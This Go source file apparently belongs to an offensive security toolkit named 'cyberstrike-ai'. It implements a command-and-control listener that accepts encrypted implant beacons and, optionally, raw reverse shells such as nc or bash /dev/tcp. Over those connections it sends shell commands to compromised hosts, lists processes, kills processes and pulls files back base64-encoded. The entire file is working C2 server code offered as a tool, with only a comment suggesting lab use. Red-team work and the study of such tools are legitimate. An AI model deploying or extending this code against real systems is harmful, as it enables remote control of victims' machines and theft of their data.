package c2

import (
	"bufio"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"cyberstrike-ai/internal/database"

	"go.uber.org/zap"
)

// TCPReverseListener listens on a TCP port for inbound reverse connections from targets.
// By default it only accepts encrypted TCP Beacons: clients send the CSB1 magic bytes, then authenticate via AES-GCM + ImplantToken before a session is registered.
// Optional legacy mode (config.allow_legacy_shell=true): raw interactive shell compatible with nc / bash -i >& /dev/tcp without authentication (recommended for isolated lab use only).
// Task dispatch (legacy mode): synchronous exec -- sends command bytes and reads output until an end marker.
type TCPReverseListener struct {
	rec     *database.C2Listener
	cfg     *ListenerConfig
	manager *Manager
	logger  *zap.Logger

	mu       sync.Mutex
	listener net.Listener
	stopCh   chan struct{}
	conns    map[string]*tcpReverseConn // session_id -> connection
	stopOnce sync.Once
}

// tcpReverseConn holds runtime state for a single reverse-shell connection.
type tcpReverseConn struct {
	sessionID string
	conn      net.Conn
	reader    *bufio.Reader
	writeMu   sync.Mutex // serializes writes across concurrent tasks
	taskMode  int32      // atomic flag: 0=idle (handleConn reads), 1=in-task (runTaskOnConn owns reads)
}

// NewTCPReverseListener is the factory registered under ListenerRegistry["tcp_reverse"].
func NewTCPReverseListener(ctx ListenerCreationCtx) (Listener, error) {
	return &TCPReverseListener{
		rec:     ctx.Listener,
		cfg:     ctx.Config,
		manager: ctx.Manager,
		logger:  ctx.Logger,
		stopCh:  make(chan struct{}),
		conns:   make(map[string]*tcpReverseConn),
	}, nil
}

// Type returns the listener type constant.
func (l *TCPReverseListener) Type() string { return string(ListenerTypeTCPReverse) }

// Start begins TCP listening and launches the accept loop in a goroutine.
func (l *TCPReverseListener) Start() error {
	addr := fmt.Sprintf("%s:%d", l.rec.BindHost, l.rec.BindPort)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		if isAddrInUse(err) {
			return ErrPortInUse
		}
		return err
	}
	l.mu.Lock()
	l.listener = ln
	l.mu.Unlock()
	go l.acceptLoop()
	go l.taskDispatcherLoop()
	return nil
}

// Stop closes the listener and all active connections.
func (l *TCPReverseListener) Stop() error {
	l.stopOnce.Do(func() {
		close(l.stopCh)
	})
	l.mu.Lock()
	if l.listener != nil {
		_ = l.listener.Close()
		l.listener = nil
	}
	for sid, c := range l.conns {
		_ = c.conn.Close()
		delete(l.conns, sid)
	}
	l.mu.Unlock()
	return nil
}

func (l *TCPReverseListener) acceptLoop() {
	for {
		l.mu.Lock()
		ln := l.listener
		l.mu.Unlock()
		if ln == nil {
			return
		}
		conn, err := ln.Accept()
		if err != nil {
			select {
			case <-l.stopCh:
				return
			default:
			}
			if isClosedConnErr(err) {
				return
			}
			l.logger.Warn("tcp_reverse accept failed", zap.Error(err))
			continue
		}
		go l.handleConn(conn)
	}
}

// handleConn first detects an encrypted TCP Beacon (CSB1 magic + AES-GCM + Token);
// otherwise it rejects the connection or falls back to a legacy raw shell depending on config.
func (l *TCPReverseListener) handleConn(conn net.Conn) {
	br := bufio.NewReader(conn)
	remote := conn.RemoteAddr().String()

	_ = conn.SetReadDeadline(time.Now().Add(tcpBeaconPeekTimeout))
	prefix, peekErr := br.Peek(4)
	if peekErr == nil && len(prefix) == 4 && string(prefix) == tcpBeaconMagic {
		if _, err := br.Discard(4); err != nil {
			_ = conn.Close()
			return
		}
		_ = conn.SetReadDeadline(time.Time{})
		l.handleTCPBeaconSession(conn, br)
		return
	}

	if !l.cfg.AllowLegacyShell {
		l.logger.Debug("tcp_reverse rejected unencrypted connection", zap.String("remote", remote))
		_ = conn.Close()
		return
	}

	_ = conn.SetReadDeadline(time.Time{})
	l.handleShellConn(conn, br)
}

// handleShellConn handles a legacy raw TCP reverse shell (compatible with nc/bash /dev/tcp);
// requires allow_legacy_shell to be explicitly enabled on the listener.
func (l *TCPReverseListener) handleShellConn(conn net.Conn, br *bufio.Reader) {
	remote := conn.RemoteAddr().String()
	host, _, _ := net.SplitHostPort(remote)

	// Derive a stable implant_uuid from listener + remote_ip so reconnects from the same host reuse the session.
	uuidSeed := fmt.Sprintf("%s|%s", l.rec.ID, host)
	hash := sha256.Sum256([]byte(uuidSeed))
	implantUUID := hex.EncodeToString(hash[:8])

	checkin := ImplantCheckInRequest{
		ImplantUUID:   implantUUID,
		Hostname:      "tcp_" + host,
		Username:      "unknown",
		OS:            "unknown",
		Arch:          "unknown",
		InternalIP:    host,
		SleepSeconds:  0, // interactive shell does not sleep
		JitterPercent: 0,
		Metadata: map[string]interface{}{
			"transport": "tcp_reverse",
			"remote":    remote,
		},
	}
	session, err := l.manager.IngestCheckIn(l.rec.ID, checkin)
	if err != nil {
		l.logger.Warn("tcp_reverse failed to register session", zap.Error(err))
		_ = conn.Close()
		return
	}

	tc := &tcpReverseConn{
		sessionID: session.ID,
		conn:      conn,
		reader:    br,
	}
	l.mu.Lock()
	if old, exists := l.conns[session.ID]; exists {
		_ = old.conn.Close()
	}
	l.conns[session.ID] = tc
	l.mu.Unlock()

	defer func() {
		l.mu.Lock()
		if cur, ok := l.conns[session.ID]; ok && cur == tc {
			delete(l.conns, session.ID)
			_ = l.manager.MarkSessionDead(session.ID)
		}
		l.mu.Unlock()
		_ = conn.Close()
	}()

	// Main loop: monitor connection liveness and capture unsolicited output between tasks.
	// Note: always read via tc.reader to avoid splitting buffered bytes with runTaskOnConn.
	buf := make([]byte, 4096)
	for {
		select {
		case <-l.stopCh:
			return
		default:
		}
		// Pause while runTaskOnConn owns exclusive read access during task execution.
		if atomic.LoadInt32(&tc.taskMode) == 1 {
			time.Sleep(100 * time.Millisecond)
			continue
		}
		_ = conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		n, err := tc.reader.Read(buf)
		if n > 0 {
			// Refresh heartbeat whenever data arrives.
			_ = l.manager.DB().TouchC2Session(session.ID, string(SessionActive), time.Now())
			if atomic.LoadInt32(&tc.taskMode) == 0 {
				l.manager.publishEvent("info", "task", session.ID, "",
					"stdout(unsolicited)", map[string]interface{}{
						"output": string(buf[:n]),
					})
			}
		}
		if err != nil {
			if err == io.EOF || isClosedConnErr(err) {
				return
			}
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				// Read timeout means the connection is alive but idle; refresh heartbeat so the watchdog does not mark it dead.
				_ = l.manager.DB().TouchC2Session(session.ID, string(SessionActive), time.Now())
				continue
			}
			return
		}
	}
}

// taskDispatcherLoop periodically polls task queues for active sessions and dispatches synchronous commands.
func (l *TCPReverseListener) taskDispatcherLoop() {
	t := time.NewTicker(500 * time.Millisecond)
	defer t.Stop()
	for {
		select {
		case <-l.stopCh:
			return
		case <-t.C:
			l.mu.Lock()
			snapshot := make([]*tcpReverseConn, 0, len(l.conns))
			for _, c := range l.conns {
				snapshot = append(snapshot, c)
			}
			l.mu.Unlock()
			for _, c := range snapshot {
				envelopes, err := l.manager.PopTasksForBeacon(c.sessionID, 5)
				if err != nil || len(envelopes) == 0 {
					continue
				}
				for _, env := range envelopes {
					go l.runTaskOnConn(c, env)
				}
			}
		}
	}
}

// runTaskOnConn translates a task into a raw shell command and reads output until the end marker.
func (l *TCPReverseListener) runTaskOnConn(c *tcpReverseConn, env TaskEnvelope) {
	startedAt := NowUnixMillis()
	cmd, ok := buildTCPCommand(TaskType(env.TaskType), env.Payload)
	if !ok {
		l.reportTaskResult(env.TaskID, startedAt, false, "", "tcp_reverse listener does not support this task type: "+env.TaskType, "", "")
		return
	}

	// Acquire exclusive read access by signaling the handleConn loop to pause.
	atomic.StoreInt32(&c.taskMode, 1)
	defer atomic.StoreInt32(&c.taskMode, 0)

	// Wait briefly for any in-flight Read in handleConn to finish or time out.
	time.Sleep(150 * time.Millisecond)

	// Drain stale bytes (such as shell prompts) left in the buffer.
	drainStaleData(c.reader, c.conn)

	endMark := fmt.Sprintf("__C2_DONE_%s__", env.TaskID)
	wrapped := fmt.Sprintf("%s\necho %s\n", strings.TrimSpace(cmd), endMark)
	c.writeMu.Lock()
	_ = c.conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
	if _, err := c.conn.Write([]byte(wrapped)); err != nil {
		c.writeMu.Unlock()
		l.reportTaskResult(env.TaskID, startedAt, false, "", "Failed to write command: "+err.Error(), "", "")
		return
	}
	c.writeMu.Unlock()

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	output, err := readUntilMarker(ctx, c.reader, endMark)
	if err != nil {
		l.reportTaskResult(env.TaskID, startedAt, false, output, "Failed to read result: "+err.Error(), "", "")
		return
	}
	cleaned := cleanShellOutput(output, cmd)
	if TaskType(env.TaskType) == TaskTypeDownload {
		if errMsg := detectDownloadShellError(cleaned); errMsg != "" {
			l.reportTaskResult(env.TaskID, startedAt, false, cleaned, errMsg, "", "")
			return
		}
	}
	l.reportTaskResult(env.TaskID, startedAt, true, cleaned, "", "", "")
}

// reportTaskResult adapts task results to Manager.IngestTaskResult for unified reporting.
func (l *TCPReverseListener) reportTaskResult(taskID string, startedAtMS int64, success bool, output, errMsg, blobB64, blobSuffix string) {
	_ = l.manager.IngestTaskResult(TaskResultReport{
		TaskID:     taskID,
		Success:    success,
		Output:     output,
		Error:      errMsg,
		BlobBase64: blobB64,
		BlobSuffix: blobSuffix,
		StartedAt:  startedAtMS,
		EndedAt:    NowUnixMillis(),
	})
}

// buildTCPCommand converts a (TaskType, payload) pair into a raw shell command string.
// Only minimal task types executable over a raw TCP shell are supported; download emits base64 text,
// while binary transfers like upload/screenshot should use http_beacon.
func buildTCPCommand(t TaskType, payload map[string]interface{}) (string, bool) {
	switch t {
	case TaskTypeExec, TaskTypeShell:
		cmd, _ := payload["command"].(string)
		return cmd, true
	case TaskTypePwd:
		return "pwd 2>/dev/null || cd", true
	case TaskTypeLs:
		path, _ := payload["path"].(string)
		if strings.TrimSpace(path) == "" {
			path = "."
		}
		return "ls -la " + shellQuote(path), true
	case TaskTypePs:
		return "ps -ef 2>/dev/null || ps aux", true
	case TaskTypeKillProc:
		pid, _ := payload["pid"].(float64)
		if pid <= 0 {
			return "", false
		}
		return fmt.Sprintf("kill -9 %d", int(pid)), true
	case TaskTypeCd:
		path, _ := payload["path"].(string)
		if strings.TrimSpace(path) == "" {
			return "", false
		}
		return "cd " + shellQuote(path) + " && pwd", true
	case TaskTypeDownload:
		path, _ := payload["remote_path"].(string)
		if strings.TrimSpace(path) == "" {
			return "", false
		}
		q := shellQuote(path)
		return fmt.Sprintf(
			`f=%s; if [ ! -e "$f" ]; then echo 'C2_DOWNLOAD_ERR: no such file or directory' >&2; exit 1; elif [ -d "$f" ]; then echo 'C2_DOWNLOAD_ERR: is a directory' >&2; exit 1; elif [ ! -r "$f" ]; then echo 'C2_DOWNLOAD_ERR: permission denied' >&2; exit 1; else base64 "$f" 2>/dev/null || base64 < "$f"; fi`,
			q,
		), true
	case TaskTypeExit:
		return "exit 0", true
	}
	return "", false
}

// readUntilMarker reads continuously from r until marker appears and returns the output before marker.
func readUntilMarker(ctx context.Context, r *bufio.Reader, marker string) (string, error) {
	var sb strings.Builder
	buf := make([]byte, 4096)
	deadline := time.Now().Add(60 * time.Second)
	for {
		select {
		case <-ctx.Done():
			return sb.String(), ctx.Err()
		default:
		}
		if time.Now().After(deadline) {
			return sb.String(), fmt.Errorf("timeout")
		}
		n, err := r.Read(buf)
		if n > 0 {
			sb.Write(buf[:n])
			if idx := strings.Index(sb.String(), marker); idx >= 0 {
				return strings.TrimRight(sb.String()[:idx], "\r\n"), nil
			}
		}
		if err != nil {
			return sb.String(), err
		}
	}
}

func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
}

// detectDownloadShellError detects shell/base64 error messages returned during download tasks.
func detectDownloadShellError(output string) string {
	trimmed := strings.TrimSpace(output)
	if trimmed == "" {
		return ""
	}
	lower := strings.ToLower(trimmed)
	markers := []string{
		"c2_download_err:",
		"no such file",
		"permission denied",
		"is a directory",
		"cannot open",
		"not a regular file",
	}
	for _, m := range markers {
		if strings.Contains(lower, m) {
			return trimmed
		}
	}
	return ""
}

func isAddrInUse(err error) bool {
	if err == nil {
		return false
	}
	return strings.Contains(strings.ToLower(err.Error()), "address already in use") ||
		strings.Contains(strings.ToLower(err.Error()), "bind: only one usage")
}

func isClosedConnErr(err error) bool {
	if err == nil {
		return false
	}
	es := err.Error()
	return strings.Contains(es, "use of closed network connection") ||
		strings.Contains(es, "connection reset by peer")
}

// drainStaleData reads and discards residual shell prompts or leftover bytes using a short timeout.
func drainStaleData(r *bufio.Reader, conn net.Conn) {
	buf := make([]byte, 4096)
	for {
		_ = conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
		n, err := r.Read(buf)
		if n == 0 || err != nil {
			break
		}
	}
	// Clear the short read deadline.
	_ = conn.SetReadDeadline(time.Time{})
}

var shellPromptRe = regexp.MustCompile(`(?m)^.*?(bash[\-\d.]*\$|[\$#%>]\s*)$`)

// cleanShellOutput strips shell prompt lines and echoed commands, returning clean command output.
func cleanShellOutput(raw, cmd string) string {
	lines := strings.Split(raw, "\n")
	var cleaned []string
	cmdTrimmed := strings.TrimSpace(cmd)
	echoSkipped := false
	for _, line := range lines {
		trimmed := strings.TrimRight(line, "\r \t")
		// Skip the echoed command line produced by interactive shells.
		if !echoSkipped && cmdTrimmed != "" && strings.Contains(trimmed, cmdTrimmed) {
			echoSkipped = true
			continue
		}
		// Skip standalone shell prompt lines.
		if shellPromptRe.MatchString(trimmed) && len(strings.TrimSpace(shellPromptRe.ReplaceAllString(trimmed, ""))) == 0 {
			continue
		}
		cleaned = append(cleaned, line)
	}
	result := strings.Join(cleaned, "\n")
	return strings.TrimSpace(result)
}
